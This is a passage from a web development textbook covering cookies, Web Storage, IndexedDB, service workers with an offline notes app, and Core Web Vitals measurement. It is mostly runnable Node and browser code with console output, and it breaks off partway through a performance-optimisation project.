## Unit 12.1 — Cookies

**One-line summary:** A cookie is a small name–value pair that a server sets with `Set-Cookie` and the browser sends back in the `Cookie` header of every matching request; its attributes decide its lifetime (`Max-Age`/`Expires`), scope (`Domain`, `Path`), and safety — `HttpOnly` hides it from JavaScript, `Secure` restricts it to HTTPS, and `SameSite` limits when it is sent with cross-site requests.

```js
// file: cookies/server.mjs
// Cookies: set by the server, stored by the browser, sent back automatically with matching requests.
import http from "node:http";

http.createServer((req, res) => {
  console.log(`  server: ${req.method} ${req.url}  Cookie: ${req.headers.cookie ?? "(none)"}`);
  if (req.url === "/login") {
    res.writeHead(200, { "Content-Type": "text/html", "Set-Cookie": [
      "session=s3cr3t; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600",   // invisible to JavaScript
      "theme=dark; SameSite=Lax; Path=/; Max-Age=31536000",                    // readable by JavaScript
      "cart=3; Path=/shop",                                                    // only sent under /shop
    ] });
    return res.end(`<!DOCTYPE html><title>login</title><script>
      console.log("document.cookie on /login: " + document.cookie);
      document.cookie = "consent=yes; Max-Age=600; SameSite=Lax";              // set from JavaScript
      document.cookie = "session=stolen";                                       // cannot overwrite HttpOnly
      console.log("after writing: " + document.cookie);
    </script>`);
  }
  res.writeHead(200, { "Content-Type": "text/plain" }).end("ok\n");
}).listen(8110);
```

```console
$ cd cookies && python3 ../../tools/page.py http://localhost:8110/login "eval:fetch('/api').then(r => r.status)" "eval:fetch('/shop/items').then(r => r.status)" --serve "node server.mjs" --server-log
  server: HEAD /login  Cookie: (none)
  server: GET /login  Cookie: (none)
document.cookie on /login: theme=dark
after writing: theme=dark; consent=yes
  server: GET /api  Cookie: session=s3cr3t; theme=dark; consent=yes
=> 200
  server: GET /shop/items  Cookie: cart=3; session=s3cr3t; theme=dark; consent=yes
=> 200
```

JavaScript sees only `theme` and the cookie it set itself: the `HttpOnly` session cookie is invisible, and the attempt to overwrite it is silently ignored. Yet the browser sends `session` with every request to the server, and `cart` only under `/shop`. The `Secure` cookie was accepted over plain HTTP because `http://localhost` counts as a secure context; on any other HTTP host it would be refused.

### Pattern

**P-11. Session cookies should be `HttpOnly; Secure; SameSite=Lax` (or `Strict`), with a `__Host-` name prefix (which forces `Secure`, `Path=/`, and no `Domain`), and should never be readable by JavaScript; store nothing sensitive in cookies that scripts can read, and nothing at all that can be guessed.** *(RFC 6265bis "Cookies: HTTP State Management Mechanism" §4.1.3 cookie name prefixes, §8.8 SameSite; OWASP "Session Management Cheat Sheet")* *Trade-off:* `HttpOnly` sessions require the server to protect state-changing requests against CSRF (Chapter 14), and `SameSite=Strict` drops the cookie when users arrive from links on other sites, so they appear logged out on the first page.

## Unit 12.2 — Web Storage

**One-line summary:** `localStorage` (persistent) and `sessionStorage` (per tab) store string key–value pairs per origin, synchronously, up to about 5 MB; other documents of the same origin receive a `storage` event when a value changes — which makes it simple, but unsuitable for large or structured data and slow for frequent writes, because every access blocks the main thread.

```html
<!-- file: storage/storage.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Web Storage</title></head>
<body>
  <iframe id="other" src="listener.html" hidden></iframe>
  <script type="module">
    await new Promise((r) => document.getElementById("other").addEventListener("load", r, { once: true }));
    localStorage.clear();
    localStorage.setItem("count", 1);                         // everything is stored as a string
    localStorage.prefs = { theme: "dark" };                   // property syntax works too ... badly
    console.log(`count: ${JSON.stringify(localStorage.getItem("count"))}, prefs: ${JSON.stringify(localStorage.prefs)}`);
    localStorage.setItem("prefs", JSON.stringify({ theme: "dark" }));            // serialise explicitly
    console.log(`parsed back: ${JSON.parse(localStorage.getItem("prefs")).theme}; missing key: ${localStorage.getItem("nope")}`);
    sessionStorage.setItem("draft", "per tab, cleared when the tab closes");
    try { localStorage.setItem("big", "x".repeat(6_000_000)); }                   // about 5 MB per origin
    catch (e) { console.log(`quota: ${e.name}`); }
    const { usage, quota } = await navigator.storage.estimate();
    console.log(`navigator.storage.estimate(): quota for this origin is about ${Math.round(quota / 2 ** 30)} GiB`);
  </script>
</body>
</html>
```

```html
<!-- file: storage/listener.html -->
<!DOCTYPE html>
<title>Another document of the same origin</title>
<script>
  // The storage event fires in OTHER documents of the origin, never in the one that made the change.
  addEventListener("storage", (e) => console.log(`  [other document] storage event: ${e.key} = ${e.newValue}`));
</script>
```

```console
$ cd storage && python3 ../../tools/page.py http://localhost:8111/storage.html wait:300 --serve "node ../../ch00/project/static.mjs . 8111"
count: "1", prefs: "[object Object]"
parsed back: dark; missing key: null
quota: QuotaExceededError
  [other document] storage event: draft = per tab, cleared when the tab closes
  [other document] storage event: count = 1
  [other document] storage event: prefs = [object Object]
  [other document] storage event: prefs = {"theme":"dark"}
navigator.storage.estimate(): quota for this origin is about 2 GiB
```

The number came back as the string `"1"`, and the object was stored as `"[object Object]"` — always `JSON.stringify` explicitly. Six million characters exceed the quota. The iframe, another document of the same origin, received a `storage` event for each change; the page that made them did not. (It also received one for `sessionStorage`, because an iframe shares its tab's session storage.)

### Mastery check

1. **Explain.** Why is `localStorage` a poor place for an authentication token?

## Unit 12.3 — IndexedDB

**One-line summary:** IndexedDB is a transactional database of object stores in the browser: it stores structured-cloneable values (dates, maps, blobs, nested objects) under keys, supports indexes and key ranges, groups operations into transactions that commit or roll back together, upgrades its schema through versioned `upgradeneeded` events, and is asynchronous — but its event-based API is usually wrapped in promises.

```html
<!-- file: storage/idb.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>IndexedDB</title></head>
<body>
  <script type="module">
    // IndexedDB's API is event-based; this helper turns a request into a promise.
    const done = (req) => new Promise((ok, no) => { req.onsuccess = () => ok(req.result); req.onerror = () => no(req.error); });

    indexedDB.deleteDatabase("shop");
    const open = indexedDB.open("shop", 1);
    open.onupgradeneeded = () => {                              // runs when the version number increases
      const orders = open.result.createObjectStore("orders", { keyPath: "id", autoIncrement: true });
      orders.createIndex("byCustomer", "customer");
      orders.createIndex("byTotal", "total");
      console.log("upgradeneeded: created store and indexes");
    };
    const db = await done(open);

    const tx = db.transaction("orders", "readwrite");           // all or nothing
    const store = tx.objectStore("orders");
    for (const o of [{ customer: "ana", total: 2500, placed: new Date(2026, 0, 5) },
                     { customer: "bo", total: 900, placed: new Date(2026, 1, 1) },
                     { customer: "ana", total: 4100, placed: new Date(2026, 2, 9), items: new Map([["A1", 2]]) }])
      store.add(o);
    await new Promise((r) => (tx.oncomplete = r));

    const read = db.transaction("orders").objectStore("orders");
    const anas = await done(read.index("byCustomer").getAll("ana"));
    console.log(`ana's orders: ${anas.map((o) => `#${o.id} ${o.total}`).join(", ")}`);
    console.log(`a Date and a Map survive (structured clone): ${anas[1].placed instanceof Date}, ${anas[1].items.get("A1")}`);
    const big = await done(read.index("byTotal").getAll(IDBKeyRange.lowerBound(1000)));
    console.log(`orders >= 1000: ${big.map((o) => o.id)}`);

    const failing = db.transaction("orders", "readwrite");
    failing.objectStore("orders").add({ customer: "cy", total: 1 });
    failing.objectStore("orders").add({ id: 1, customer: "dup", total: 2 });   // key 1 exists: error
    await new Promise((r) => (failing.onabort = r));
    console.log(`after the failed transaction: ${await done(db.transaction("orders").objectStore("orders").count())} orders (cy rolled back)`);
  </script>
</body>
</html>
```

```console
$ cd storage && python3 ../../tools/page.py http://localhost:8111/idb.html wait:300 --serve "node ../../ch00/project/static.mjs . 8111"
upgradeneeded: created store and indexes
ana's orders: #1 2500, #3 4100
a Date and a Map survive (structured clone): true, 2
orders >= 1000: 1,3
after the failed transaction: 3 orders (cy rolled back)
```

The index answers "orders of customer ana" and "orders of at least 1000" without scanning everything. The `Date` and `Map` came back as real objects. In the failing transaction, the first `add` succeeded, the second violated the key constraint, and the whole transaction was aborted — the first order was rolled back too.

### Deep & Tricky

**DT-36. An IndexedDB transaction commits automatically as soon as no requests are pending when control returns to the event loop — so `await`-ing anything that is *not* an IndexedDB request in the middle of a transaction (a `fetch`, a timer, even some promise chains) lets it commit, and the next request throws `TransactionInactiveError`. Do all the asynchronous work first, then open a transaction and issue its requests without waiting on anything else.** *(Indexed Database API 3.0 §2.7.2 "Transaction lifecycle": a transaction becomes inactive when control returns to the event loop, and auto-commits when it has no outstanding requests)*

### Mastery check

1. **Predict.** In the failing transaction, what would happen if the error handler of the second `add` called `event.preventDefault()`?

## Topic 12B — Service workers

## Unit 12.4 — The service worker life cycle and caching strategies

**One-line summary:** A service worker is a script that runs separately from pages, intercepts their network requests in a `fetch` event, and can answer from the Cache API, from the network, or from code; it is installed once (precaching files in `install`), activated (cleaning old caches in `activate`), and controls pages loaded after that — so the first visit is never offline-capable, and updates follow a deliberate install–wait–activate cycle.

| Strategy | How it answers | Use for |
| --- | --- | --- |
| Cache first | Cache, else network | Versioned app shell, fonts, hashed assets |
| Network first | Network, else cache | HTML or API data that should be fresh but must work offline |
| Stale-while-revalidate | Cache now, update the cache from the network in the background | Avatars, non-critical data |
| Network only | Network | Requests that must not be cached (payments, writes) |

The project's worker uses the first and the last; the units' table is the menu to choose from.

### Deep & Tricky

**DT-37. A new service worker does not take over while any page controlled by the old one is open: it installs and then *waits*, so users can run old code for days, and reloading one tab is not enough (the page is not unloaded before the next one is controlled). `skipWaiting()` and `clients.claim()` make the new worker take over at once — at the risk that an already-loaded page now talks to a worker (and caches) written for a newer version of the page.** *(Service Workers specification §3.1 "Service worker lifecycle" and `skipWaiting()`; web.dev, "The service worker lifecycle")* Always version cache names, and make the page and the worker tolerate each other's versions.

## Chapter 12 Project — A local-first notes app

### Requirements

- Notes are saved to IndexedDB immediately and shown at once; each has a client-generated ID.
- A service worker precaches the app shell, so the app loads with no network.
- Unsynced notes are uploaded to the server with `PUT /api/notes` (idempotent by ID) when the app loads, after each change, and when the browser comes back online; unsynced notes are marked as pending.
- A web app manifest makes it installable.

Test the full story: first load, a note written online, an offline reload, a note written offline, and synchronisation when the connection returns.

### Reference solution

```js
// file: project/server.mjs
// Serves the app and a tiny notes API; prints every request so we can see what reaches the network.
import http from "node:http";
import { readFile } from "node:fs/promises";
import path from "node:path";

const types = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css",
                ".webmanifest": "application/manifest+json" };
const notes = [];
http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  if (req.method !== "HEAD") console.log(`  server: ${req.method} ${url.pathname}`);
  if (url.pathname === "/api/notes" && req.method === "GET")
    return res.writeHead(200, { "Content-Type": "application/json" }).end(JSON.stringify(notes));
  if (url.pathname === "/api/notes" && req.method === "PUT") {
    let body = ""; for await (const c of req) body += c;
    const note = JSON.parse(body);
    if (!notes.some((n) => n.id === note.id)) notes.push(note);       // PUT by id: safe to repeat
    console.log(`  server: stored "${note.text}" (${notes.length} notes)`);
    return res.writeHead(204).end();
  }
  const file = url.pathname === "/" ? "index.html" : path.basename(url.pathname);
  try {
    const body = await readFile(path.join("public", file));
    res.writeHead(200, { "Content-Type": types[path.extname(file)] ?? "application/octet-stream", "Cache-Control": "no-cache" }).end(body);
  } catch { res.writeHead(404).end(); }
}).listen(8112);
```

```html
<!-- file: project/public/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Notes</title>
  <link rel="manifest" href="/manifest.webmanifest">
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <h1>Notes <span id="status"></span></h1>
  <form id="f"><input id="text" aria-label="New note" required><button>Add</button></form>
  <ul id="notes"></ul>
  <script type="module" src="/app.js"></script>
</body>
</html>
```

```css
/* file: project/public/style.css */
body { font-family: system-ui, sans-serif; max-width: 40rem; margin: 2rem auto; }
.pending { opacity: 0.6; font-style: italic; }
```

```svg
<!-- file: project/public/icon.svg -->
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" rx="12" fill="#663399"/><path d="M18 20h28M18 32h28M18 44h18" stroke="white" stroke-width="5" stroke-linecap="round"/></svg>
```

```js
// file: project/public/sw.js
// The service worker: precache the app shell, serve it offline, and keep API data fresh when possible.
const VERSION = "v1";
const SHELL = ["/", "/app.js", "/db.js", "/style.css", "/manifest.webmanifest"];

self.addEventListener("install", (event) => {
  event.waitUntil(caches.open(`shell-${VERSION}`).then((c) => c.addAll(SHELL)));
  self.skipWaiting();                                      // take over without waiting for old tabs to close
});

self.addEventListener("activate", (event) => {
  event.waitUntil((async () => {
    for (const key of await caches.keys()) if (!key.endsWith(VERSION)) await caches.delete(key);   // old versions
    await self.clients.claim();                            // control already-open pages now
  })());
});

self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);
  if (event.request.method !== "GET" || url.origin !== location.origin) return;   // let the browser handle it
  if (url.pathname.startsWith("/api/")) {
    event.respondWith(fetch(event.request));               // API: network only (the app keeps its own copy)
    return;
  }
  event.respondWith((async () => {                         // app shell: cache first, network as a fallback
    const cached = await caches.match(event.request, { ignoreSearch: true });
    return cached ?? fetch(event.request);
  })());
});
```

```js
// file: project/public/db.js
// A promise wrapper around one IndexedDB object store.
const done = (req) => new Promise((ok, no) => { req.onsuccess = () => ok(req.result); req.onerror = () => no(req.error); });
const open = indexedDB.open("notes", 1);
open.onupgradeneeded = () => open.result.createObjectStore("notes", { keyPath: "id" });
const db = await done(open);

export const all = () => done(db.transaction("notes").objectStore("notes").getAll());
export const put = (note) => done(db.transaction("notes", "readwrite").objectStore("notes").put(note));
```

```js
// file: project/public/app.js
// Local-first: every note is saved in IndexedDB at once, then uploaded when the network allows.
import * as db from "/db.js";

const list = document.getElementById("notes"), status = document.getElementById("status");

async function render() {
  const notes = (await db.all()).sort((a, b) => a.created - b.created);
  list.replaceChildren(...notes.map((n) => Object.assign(document.createElement("li"),
    { textContent: n.text, className: n.synced ? "" : "pending" })));
  status.textContent = navigator.onLine ? "" : "(offline)";
  return notes;
}

let syncing = false;
async function sync() {                                     // the outbox: upload unsynced notes, oldest first
  if (syncing || !navigator.onLine) return;
  syncing = true;
  try {
    for (const note of (await db.all()).filter((n) => !n.synced)) {
      const res = await fetch("/api/notes", { method: "PUT", headers: { "Content-Type": "application/json" },
                                              body: JSON.stringify({ id: note.id, text: note.text }) });
      if (!res.ok) break;
      await db.put({ ...note, synced: true });
      console.log(`synced "${note.text}"`);
    }
  } catch (e) { console.log(`sync failed: ${e.message}`); }
  finally { syncing = false; await render(); }
}

document.getElementById("f").addEventListener("submit", async (e) => {
  e.preventDefault();
  const input = document.getElementById("text");
  await db.put({ id: crypto.randomUUID(), text: input.value, created: Date.now(), synced: false });
  input.value = "";
  await render();
  await sync();
});
addEventListener("online", () => { console.log("back online"); sync(); });
addEventListener("offline", () => { console.log("went offline"); render(); });

if ("serviceWorker" in navigator) await navigator.serviceWorker.register("/sw.js");
const notes = await render();
console.log(`loaded: ${notes.length} notes (${notes.filter((n) => !n.synced).length} pending), ` +
            `online ${navigator.onLine}, controlled by a service worker: ${navigator.serviceWorker.controller !== null}`);
sync();
```

The manifest is JSON, so it is created with a command:

```console
$ cd project && echo "{ \"name\": \"Notes\", \"short_name\": \"Notes\", \"start_url\": \"/\", \"display\": \"standalone\", \"background_color\": \"#ffffff\", \"theme_color\": \"#663399\", \"icons\": [{ \"src\": \"/icon.svg\", \"sizes\": \"any\", \"type\": \"image/svg+xml\" }] }" > public/manifest.webmanifest
$ cd project && python3 ../../tools/page.py http://localhost:8112/ wait:500 reload wait:300 "fill:#text|written online" press:Enter wait:300 offline:on reload wait:300 "fill:#text|written offline" press:Enter wait:300 "eval:[...document.querySelectorAll('li')].map((li) => li.textContent + (li.className ? ' [' + li.className + ']' : ''))" offline:off wait:500 "eval:[...document.querySelectorAll('li.pending')].length" --serve "node server.mjs" --server-log
  server: GET /
  server: GET /style.css
  server: GET /app.js
  server: GET /db.js
  server: GET /sw.js
loaded: 0 notes (0 pending), online true, controlled by a service worker: false
  server: GET /
  server: GET /app.js
  server: GET /db.js
  server: GET /manifest.webmanifest
  server: GET /style.css
loaded: 0 notes (0 pending), online true, controlled by a service worker: true
  server: PUT /api/notes
  server: stored "written online" (1 notes)
synced "written online"
went offline
loaded: 1 notes (0 pending), online false, controlled by a service worker: true
=> ["written online", "written offline [pending]"]
back online
  server: PUT /api/notes
  server: stored "written offline" (2 notes)
synced "written offline"
=> 0
```

Read the log in order:

1. The first load fetched the page, its files, and `sw.js` — and was *not* controlled by the service worker.
2. The second group of requests is the worker's `install` handler precaching the shell. The reload was then served entirely from the cache — no requests for it reached the server — and the page was controlled.
3. "written online" was saved locally and uploaded at once.
4. Offline, the reload still worked (from the cache) and showed the note from IndexedDB; "written offline" was saved and marked pending — nothing reached the server.
5. Back online, the `online` event triggered the outbox, which uploaded the pending note; no pending notes remained.

Uploading with `PUT` and a client-generated ID makes the upload safe to repeat: if the connection drops after the server stored a note but before the client recorded it as synced, the next attempt stores nothing twice.

### Review checklist

- Edit `sw.js` (change `VERSION` to `v2` and the CSS). Walk through what happens on the next two page loads, with and without `skipWaiting()`.
- Two tabs sync at the same moment; both upload the same notes. Is that a problem here? When would it be?
- Add deletion. How do you delete offline without losing the deletion (a "tombstone")?

## Answers to the Chapter 12 prediction questions

**Unit 12.2, Q1.** Any script running on the page — including injected or third-party script after an XSS bug — can read it and send it elsewhere; an `HttpOnly` cookie cannot be read by script at all.

**Unit 12.3, Q1.** The transaction would not abort: preventing the default action of a request's error event keeps the transaction alive, so the first `add` would be committed and only the duplicate would be skipped.

# Chapter 13 — Performance and Core Web Vitals

*Goal: make pages fast in the ways users feel, and prove it with numbers. You will learn the three Core Web Vitals — Largest Contentful Paint (loading), Interaction to Next Paint (responsiveness), and Cumulative Layout Shift (visual stability) — measure them inside the page with the same browser APIs that monitoring tools use, see what compression does and does not save, and then take a deliberately slow page through a series of fixes, measuring each under a simulated slow network and CPU. The result: LCP from about 6 s to about 2 s, the slowest interaction from 300 ms to under 20 ms, and a quarter of the bytes.*

**What you will be able to do after this chapter**

- Define LCP, INP, and CLS, their thresholds, and the difference between lab and field data.
- Measure them in the browser with `PerformanceObserver`.
- Reduce bytes and requests on the critical rendering path: compression, caching, images, preloading.
- Prevent layout shifts and long interactions.
- Run a before-and-after performance experiment and report it honestly.

## Topic 13A — Measuring

## Unit 13.1 — The Core Web Vitals

**One-line summary:** Google's Core Web Vitals measure three things users notice — how quickly the main content appears (LCP: the render time of the largest image or text block), how quickly the page responds to input (INP: roughly the slowest interaction's delay from input to the next paint), and how much content jumps around unexpectedly (CLS: the sum of layout-shift scores in the worst burst) — judged at the 75th percentile of real visits.

| Metric | Good | Needs improvement | Poor | Main causes of bad values |
| --- | --- | --- | --- | --- |
| LCP | ≤ 2.5 s | ≤ 4 s | > 4 s | Slow server, render-blocking CSS/JS, large or late-discovered hero image |
| INP | ≤ 200 ms | ≤ 500 ms | > 500 ms | Long tasks during or after input (Chapter 7), expensive rendering (Chapter 8) |
| CLS | ≤ 0.1 | ≤ 0.25 | > 0.25 | Images and embeds without dimensions, late-inserted content, web fonts |

**Lab data** (a test run on one machine with fixed conditions, as below) is reproducible and good for finding causes; **field data** (measurements from real users' browsers, "real user monitoring") is what counts, because real devices and networks vary enormously. A fast laptop on office Wi-Fi is not a typical user.

### Mastery check

1. **Explain.** Why are the vitals judged at the 75th percentile rather than the average?

## Unit 13.2 — Measuring in the page

**One-line summary:** The browser reports performance events through `PerformanceObserver`: `largest-contentful-paint` candidates, `layout-shift` entries (with the elements that moved), `event` timing for interactions, and navigation and resource timing with transfer sizes — the raw material of every monitoring library.

```js
// file: project/vitals.js
// Measures the Core Web Vitals in the page itself, the way the web-vitals library does (simplified).
const t = (ms) => `${Math.round(ms)} ms`;
let lcp = 0, cls = 0, worstEvent = 0;
const shifts = [];
new PerformanceObserver((l) => { for (const e of l.getEntries()) lcp = e.startTime; })
  .observe({ type: "largest-contentful-paint", buffered: true });
new PerformanceObserver((l) => {
  for (const e of l.getEntries()) if (!e.hadRecentInput) {
    cls += e.value;
    shifts.push(`${t(e.startTime)}: ${e.value.toFixed(3)} (` +
      e.sources.map((s) => `${s.node?.nodeName ?? "?"} moved ${Math.round(s.currentRect.y - s.previousRect.y)}px`).join(", ") + ")");
  }
})
  .observe({ type: "layout-shift", buffered: true });
new PerformanceObserver((l) => { for (const e of l.getEntries()) worstEvent = Math.max(worstEvent, e.duration); })
  .observe({ type: "event", buffered: true, durationThreshold: 16 });

window.layoutShifts = () => shifts;
window.reportVitals = () => {
  const nav = performance.getEntriesByType("navigation")[0];
  const fcp = performance.getEntriesByName("first-contentful-paint")[0];
  const bytes = [nav, ...performance.getEntriesByType("resource")].reduce((s, e) => s + e.transferSize, 0);
  return `FCP ${t(fcp?.startTime ?? NaN)}, LCP ${t(lcp)}, ` +
         `CLS ${cls.toFixed(3)}, slowest interaction ${t(worstEvent)}, transferred ${Math.round(bytes / 1024)} KiB`;
};
```

This script is loaded first by both versions of the project page. It is simplified — the `web-vitals` library also groups shifts into session windows and groups events into interactions — but it uses the same entry types.

## Topic 13B — Loading

## Unit 13.3 — Bytes: compression and images

**One-line summary:** Text resources (HTML, CSS, JavaScript, JSON, SVG) typically shrink by 70–80% with gzip and a little more with Brotli, so servers must compress them; images are already compressed, so the only way to make them smaller is to send fewer pixels (the right size for the display, Chapter 1) in a better format (AVIF, WebP).

```js
// file: compress/compress.mjs
// How much do gzip and Brotli save on real files? Text shrinks a lot; already-compressed images do not.
import { readFileSync } from "node:fs";
import { gzipSync, brotliCompressSync, constants } from "node:zlib";

const files = process.argv.slice(2);
const kib = (n) => `${(n / 1024).toFixed(1)} KiB`.padStart(11);
console.log(`${"file".padEnd(34)} ${"original".padStart(11)} ${"gzip -6".padStart(11)} ${"brotli 11".padStart(11)}`);
for (const f of files) {
  const data = readFileSync(f);
  const gz = gzipSync(data, { level: 6 }).length;
  const br = brotliCompressSync(data, { params: { [constants.BROTLI_PARAM_QUALITY]: 11 } }).length;
  console.log(`${f.split("/").slice(-2).join("/").padEnd(34)} ${kib(data.length)} ${kib(gz)} ${kib(br)}`);
}
```

```console
$ cd compress && node ../project/make-images.mjs > /dev/null && node compress.mjs ../../ch09/shop/node_modules/vite/dist/node/chunks/build.js ../../ch08/project/auto-complete.js ../../../src/ch05.md img/hero-small.png
file                                  original     gzip -6   brotli 11
chunks/build.js                      211.8 KiB    45.7 KiB    37.7 KiB
project/auto-complete.js               4.1 KiB     1.7 KiB     1.3 KiB
src/ch05.md                           30.1 KiB    11.3 KiB     9.6 KiB
img/hero-small.png                   496.8 KiB   497.0 KiB   496.8 KiB
```

A 212-KiB JavaScript file becomes 46 KiB with gzip and 38 KiB with Brotli; this chapter's Markdown, about a third of its size. The PNG photo does not shrink at all — it got slightly *bigger* with gzip. Compressing images at the HTTP level wastes server CPU.

### Deep & Tricky

**DT-38. Transfer size and decoded size are different costs: a 46-KiB gzipped script is still 212 KiB of JavaScript to parse and compile, and a 500-KiB PNG of 600 × 375 pixels decodes to 600 × 375 × 4 = 900 KiB of memory whatever its file size. On low-end phones, parsing and executing JavaScript and decoding images often cost more time than downloading them; budgets should be set on decoded JavaScript size and image pixel counts, not only on bytes transferred.** *(web.dev, "The cost of JavaScript" (Addy Osmani); Resource Timing Level 2: `transferSize`, `encodedBodySize`, `decodedBodySize`)*

## Unit 13.4 — The critical rendering path

**One-line summary:** The first render waits for the HTML, every stylesheet in the `<head>`, and every synchronous script before the content; the LCP image cannot start downloading until the parser finds it; so the fastest pages inline or shrink critical CSS, defer scripts, tell the browser about the LCP image early (`<link rel="preload">`, `fetchpriority="high"`), never lazy-load it, and serve it at the displayed size.

### Mastery check

1. **Predict.** The hero image has `loading="lazy"`. What happens to LCP, and why?

## Topic 13C — Stability and responsiveness

## Unit 13.5 — Layout shifts and slow interactions

**One-line summary:** Every element that moves without user input adds to CLS in proportion to how much of the viewport moved and how far; the cures are to reserve space — `width`/`height` attributes or `aspect-ratio` on images and embeds, `min-height` on slots for late content — and to insert new content below what the user is reading. INP is cured by keeping event handlers short: update the UI first, then do the heavy work in slices that yield (Chapter 7, Unit 7.5).

Both are demonstrated in the project.

### Pattern

**P-12. Set a performance budget (for example: LCP ≤ 2.5 s and INP ≤ 200 ms on a mid-range phone with a slow 4G connection, ≤ 150 KiB of compressed JavaScript on the critical path), measure it automatically in continuous integration (lab), and monitor the 75th percentile of real users (field).** *(web.dev, "Performance budgets 101"; Chrome UX Report methodology — 75th percentile)* *Trade-off:* lab tests are stable but not representative; field data is representative but noisy and arrives after the fact — teams need both.

## Chapter 13 Project — From slow to fast, measured

### Requirements

Take a product page with typical problems — a render-blocking stylesheet from a slow host, a parser-blocking script that runs 150 ms of work, an oversized hero image without dimensions, a banner inserted above the content after a second, and a click handler that works for 300 ms — and fix them one by one. Measure FCP, LCP, CLS, the slowest interaction, and the bytes transferred, before and after, under a slow network (400 ms latency, 400 kB/s) and a CPU slowed down four times.

### Reference solution

The images and the server (which delays the slow page's CSS by 600 ms and gzips the fast page's text files):

```js
// file: project/make-images.mjs
// Writes two PNG "photos" of random noise (noise does not compress, like a real photo):
// hero-big.png at 1200x750 and hero-small.png at 600x375.
import { deflateSync, crc32 } from "node:zlib";
import { writeFileSync, mkdirSync } from "node:fs";

function png(w, h, seed) {
  const raw = Buffer.alloc((w * 3 + 1) * h);
  let x = seed;
  for (let i = 0; i < raw.length; i++) {
    if (i % (w * 3 + 1) === 0) { raw[i] = 0; continue; }       // filter byte: none
    x = (Math.imul(x, 1103515245) + 12345) >>> 0;              // Math.imul: exact 32-bit multiply
    raw[i] = 90 + ((x >>> 24) & 63);                             // a muted grey-green noise
  }
  const chunk = (type, data) => {
    const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
    const td = Buffer.concat([Buffer.from(type), data]);
    const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(td));
    return Buffer.concat([len, td, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2;   // 8-bit RGB
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk("IHDR", ihdr),
                        chunk("IDAT", deflateSync(raw)), chunk("IEND", Buffer.alloc(0))]);
}
mkdirSync("img", { recursive: true });
writeFileSync("img/hero-big.png", png(1200, 750, 1));
writeFileSync("img/hero-small.png", png(600, 375, 2));
console.log("wrote img/hero-big.png and img/hero-small.png");
```

```js
// file: project/server.mjs
// Serves /slow/ and /fast/ versions of a page. Text files can be compressed with gzip
// when the browser asks for it and compression is switched on (?gzip in the page URL is not needed:
// the fast page's files are simply marked as compressible here).
import http from "node:http";
import { readFile } from "node:fs/promises";
import { gzipSync } from "node:zlib";
import path from "node:path";

const types = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css", ".png": "image/png" };
http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  const file = path.normalize(url.pathname.endsWith("/") ? url.pathname + "index.html" : url.pathname);
  try {
    let body = await readFile(path.join(".", file));
    const headers = { "Content-Type": types[path.extname(file)] ?? "application/octet-stream" };
    if (file.startsWith("/slow/") && file.endsWith(".css")) await new Promise((r) => setTimeout(r, 600));  // a slow CSS host
    const compressible = file.startsWith("/fast/") && /\.(html|js|css)$/.test(file);
    if (compressible && /\bgzip\b/.test(req.headers["accept-encoding"] ?? "")) {
      body = gzipSync(body);
      headers["Content-Encoding"] = "gzip";
    }
    res.writeHead(200, headers).end(body);
  } catch { res.writeHead(404).end(); }
}).listen(8120);
```

The slow page:

```html
<!-- file: project/slow/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Slow shop</title>
  <script src="/vitals.js"></script>
  <link rel="stylesheet" href="/slow/style.css">              <!-- render-blocking, from a slow host -->
  <script src="/slow/app.js"></script>                         <!-- parser-blocking -->
</head>
<body>
  <h1>Spring collection</h1>
  <div id="banner-slot"></div>
  <img src="/img/hero-big.png" alt="The spring collection">  <!-- no size: the layout jumps when it loads -->
  <p>Fresh colours for a new season.</p>
  <button id="filter">Filter products</button>
  <ul><li>Product 1: linen shirt, $21.00</li><li>Product 2: linen shirt, $22.00</li><li>Product 3: linen shirt, $23.00</li><li>Product 4: linen shirt, $24.00</li><li>Product 5: linen shirt, $25.00</li><li>Product 6: linen shirt, $26.00</li><li>Product 7: linen shirt, $27.00</li><li>Product 8: linen shirt, $28.00</li><li>Product 9: linen shirt, $29.00</li><li>Product 10: linen shirt, $30.00</li></ul>
</body>
</html>
```

```css
/* file: project/slow/style.css */
body { font-family: system-ui, sans-serif; margin: 0 auto; max-width: 600px; }
img { display: block; max-width: 100%; }
.banner { background: gold; padding: 1rem; }
```

```js
// file: project/slow/app.js
const busy = (ms) => { const end = performance.now() + ms; while (performance.now() < end) {} };
busy(150);                                                   // "initialising" synchronously, before the page renders
addEventListener("DOMContentLoaded", () => {
  setTimeout(() => {                                         // a late banner pushes the content down
    const b = Object.assign(document.createElement("div"), { className: "banner", textContent: "Free shipping this week!" });
    document.getElementById("banner-slot").append(b);
  }, 1000);
  document.getElementById("filter").addEventListener("click", () => {
    busy(300);                                               // filtering 10,000 products, synchronously
    document.getElementById("filter").textContent = "Filtered";
  });
});
```

The fixed page — inline critical CSS, a deferred script, a preloaded hero image of the right size with dimensions, a reserved slot for the banner, idle-time initialisation, and a click handler that gives feedback at once and then works in slices:

```html
<!-- file: project/fast/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Fast shop</title>
  <script src="/vitals.js"></script>
  <link rel="preload" as="image" href="/img/hero-small.png" fetchpriority="high">   <!-- start the LCP image at once -->
  <style>                                                      /* critical CSS inline: nothing blocks rendering */
    body { font-family: system-ui, sans-serif; margin: 0 auto; max-width: 600px; }
